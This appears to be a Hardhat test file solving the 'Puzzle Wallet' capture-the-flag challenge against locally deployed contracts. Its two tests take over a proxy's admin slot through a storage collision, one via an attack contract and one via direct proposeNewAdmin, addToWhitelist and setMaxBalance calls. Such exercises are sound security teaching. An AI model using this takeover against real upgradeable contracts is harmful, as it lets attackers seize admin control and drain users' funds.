const {expect} = require("chai");
const {loadFixture} = require("ethereum-waffle");
const {ethers} = require("hardhat");
const {getContractAt} = require("@nomiclabs/hardhat-ethers/internal/helpers");
const hre = require("hardhat");

describe("Puzzel Wallet Attack", function () {


    it("attack using contract", async function () {
        const {puzzleProxyContract, attackContract, user1} = await loadFixture(deployFixture)


        console.log(await puzzleProxyContract.admin())

        const tnx1 = await attackContract.connect(user1).attack1();
        await tnx1.wait();
        const tnx2 = await attackContract.connect(user1).attack2();
        await tnx2.wait();
        const tnx3 = await attackContract.connect(user1).attack3();
        await tnx3.wait();

        expect(
            await puzzleProxyContract.admin()
        ).to.be.equal(attackContract.address);

    });


    it("attack using ethers", async function () {
        const {puzzleProxyContract, BasePuzzleWallet, user1} = await loadFixture(deployFixture)
        const maxBalance = ethers.utils.parseEther("1.0");

        const logicalLayerABI = await BasePuzzleWallet.attach(puzzleProxyContract.address);

        const tnx1 = await puzzleProxyContract.connect(user1).proposeNewAdmin(user1.address);
        await tnx1.wait();
        const tnx2 = await logicalLayerABI.connect(user1).addToWhitelist(user1.address);
        await tnx2.wait();
        const tnx3 = await logicalLayerABI.connect(user1).setMaxBalance(user1.address);
        await tnx3.wait();

        expect(
            await puzzleProxyContract.admin()
        ).to.be.equal(user1.address);

    });


    async function deployFixture() {
        const [deployer, user1, user2] = await ethers.getSigners();
        let BasePuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
        let puzzleWalletContract = await BasePuzzleWallet.connect(deployer).deploy();
        await puzzleWalletContract.deployed();

        const BasePuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
        let puzzleProxyContract = await BasePuzzleProxy.connect(deployer).deploy(deployer.address, puzzleWalletContract.address,"0xb7b0422d0000000000000000000000000001000000000000000000000000000000000000");
        await puzzleProxyContract.deployed()

        const baseAttackContract = await ethers.getContractFactory("AttackPuzzelWallet");
        let attackContract = await baseAttackContract.connect(user1).deploy(puzzleProxyContract.address);
        await attackContract.deployed()

        return {puzzleProxyContract, BasePuzzleWallet, attackContract, deployer, user1, user2}
    }
});
